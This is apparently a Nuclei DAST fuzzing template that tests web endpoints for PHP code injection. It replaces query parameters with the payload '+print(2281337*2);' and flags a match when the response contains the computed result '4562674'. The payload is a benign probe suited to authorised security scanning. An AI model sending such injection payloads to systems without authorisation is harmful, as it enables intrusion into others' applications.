http:
- fuzzing:
  - fuzz:
    - '{{rce}}'
    mode: multiple
    part: query
    type: replace
  matchers:
  - type: word
    words:
    - '4562674'
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    rce:
    - +print(2281337*2);
  stop-at-first-match: true
id: php-code-injection-print
info:
  author: reewardius
  name: PHP Code Injection Print
  severity: critical
  tags: fuzzing-rce,fuzzing-req,dast
